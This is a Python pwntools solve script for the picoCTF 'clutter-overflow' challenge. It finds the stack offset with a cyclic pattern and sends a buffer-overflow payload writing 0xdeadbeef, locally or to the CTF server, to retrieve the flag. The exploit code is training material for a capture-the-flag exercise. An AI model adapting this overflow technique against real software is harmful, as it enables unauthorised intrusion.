#!/usr/bin/env python3

"""
WhatTheFuzz's submission for the picoCTF challenge clutter-overflow.

This script can be used in the following manner:
python3 ./solve.py <REMOTE/LOCAL>

Args:
    param1: LOCAL will operate locally on the user's machine.
            REMOTE will connect to the CTF webserver and grab the flag.
            If no parameter is specified, the program will default to LOCAL.

Returns:
    The flag to solve the challenge.
"""

from pwn import *

exe = ELF("./chall")

context.binary = exe
context.log_level = 'info'

NUM_CYCLIC_BYTES = 500
MAGIC_PATTERN = 0xdeadbeef
BANNER = b'What do you see?'

def calc_offset():
    '''Determine what the offset it to `code` on the stack. This is the location that we will write `0xdeadbeef`.
    '''

    # We don't want to reuse our existing process because this will cause the program to fault.
    conn = process([exe.path])

    # Generate our cyclic pattern.
    pattern = cyclic(length=NUM_CYCLIC_BYTES, n=exe.bytes)

    # Send out pattern to the program.
    conn.sendlineafter(delim=BANNER, data=pattern)

    # The program conveniently tells us what the value of `code` is after we have overwritten it, so let's parse that.
    code = conn.recvline_containsS(items='code == ')
    code = code.partition('code == 0x')[2]
    code = int(code, base=16)

    offset = cyclic_find(code, n=exe.bytes)
    log.info(f'The offset to code is : {offset}')

    return offset

def conn():
    '''Establish the connection to the process, local or remote.
    '''

    if args.get('REMOTE'):
        r = remote("mars.picoctf.net", 31890)

    else:
        r = process([exe.path])

    return r

def main():
    '''Return the flag.
    '''

    r = conn()

    # Determine the offset to `code`.
    offset = calc_offset()

    # Create our payload at the offset we just learned.
    payload = fit({
        offset: MAGIC_PATTERN
    })

    # Send it!
    r.sendlineafter(delim=BANNER, data=payload)

    # Get the flag back.
    flag = r.recvline_contains(b'picoCTF')

    # Close the connection.
    r.close()
    log.success(f'The flag is: {flag}')
    return flag


if __name__ == "__main__":
    main()
